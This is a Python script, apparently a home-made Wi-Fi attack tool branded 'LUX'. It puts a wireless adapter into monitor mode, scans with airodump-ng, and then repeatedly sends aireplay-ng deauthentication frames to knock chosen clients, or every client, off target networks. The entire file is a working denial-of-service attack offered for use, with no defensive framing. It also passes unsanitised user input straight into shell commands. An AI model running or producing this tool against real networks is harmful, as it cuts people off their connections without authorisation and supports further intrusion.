import os

print ("""

██╗     ██╗   ██╗██╗  ██╗
██║     ██║   ██║╚██╗██╔╝
██║     ██║   ██║ ╚███╔╝ 
██║     ██║   ██║ ██╔██╗ 
███████╗╚██████╔╝██╔╝ ██╗
╚══════╝ ╚═════╝ ╚═╝  ╚═╝

""")
print("ADMINISTRATIVE PERMISSIONS NEEDED \n")
#print("Enter the adapters to use for package injection and scanning:")

os.system("    sudo ifconfig | grep -E '^[a-zA-Z0-9]+:'")
tbssid=[]
cmac=[]
channel=[]
adap=str(input("Enter the adapters to use for package injection and scanning:"))
os.system("""
   echo "Stopping NetworkManager and wpa_supplicant..."
    sudo systemctl stop NetworkManager
    sudo systemctl stop wpa_supplicant

    echo  "Setting up adapter $adapter in monitor mode..."
    sudo ip link set """ + adap+ """ down
    sudo iw dev """ + adap+ """ set type monitor
    sudo ip link set """ + adap+ """ up
""")

print("Scanning on "+adap+"....")
os.system("gnome-terminal -- bash -c 'sudo airodump-ng '"+adap)
print("")
while(True):
    try:
    
        networkc=int(input("Enter the number of networks to attack : "))
        break
    except:
        print("Enter integral values only.")
print("")
for i in range(networkc):
    bssid=str(input("Enter the target"+str(i+1)+" BSSID: "))
    tbssid.append(bssid)

# CLIENT
print("")

#while(True):
  #  try:
  #      print("Selected networks: ", tbssid)
  #      networkc=int(input("Enter the number of clients to attack for the selected networks respectively: "))
  #      break
 #   except:
  #      print("Enter integral values only.")
print("")
for j in range(networkc):
    mac=input("Enter the client"+str(j+1)+" MAC to deauth (leave blank for all) :")
    
    cmac.append(mac)
    
#channel
print("")
print("Selected networks"+str(tbssid))
for k in range (len(tbssid)):
    cn=str(input("Enter the channel number of "+tbssid[k] +" :"))
    channel.append(cn)

while(True):
    try:
        packets=int(input("Enter the amount of packets to send:"))
        break
    except:
        print("Enter integral values only.")
import time as t
while (True):
    try:
        delay=float(input("Enter delay (in seconds):"))
        break
    except:
        print("Enter float value only.")
print(tbssid)
print(channel)
print(cmac)
print("")
netw=0
for l in range(packets):
    
    for netw in range(len(tbssid)):
        os.system("iwconfig "+adap+ " channel " +channel[netw] )
        if(cmac[netw]==""):
            print("Deauthing all clients from "+ tbssid[netw])
            os.system("aireplay-ng --deauth 1 -a "+tbssid[netw]+ " " + adap )
        else:
            print("Deauthing client "+ cmac[netw]+" from "+ tbssid[netw]+ " at channel "+channel[netw])
            os.system("aireplay-ng --deauth 1 -a " + tbssid[netw]+" -c "+cmac[netw]+ " "  + adap)
    
    t.sleep(delay)

        
print("ATTACK COMPLETE!")





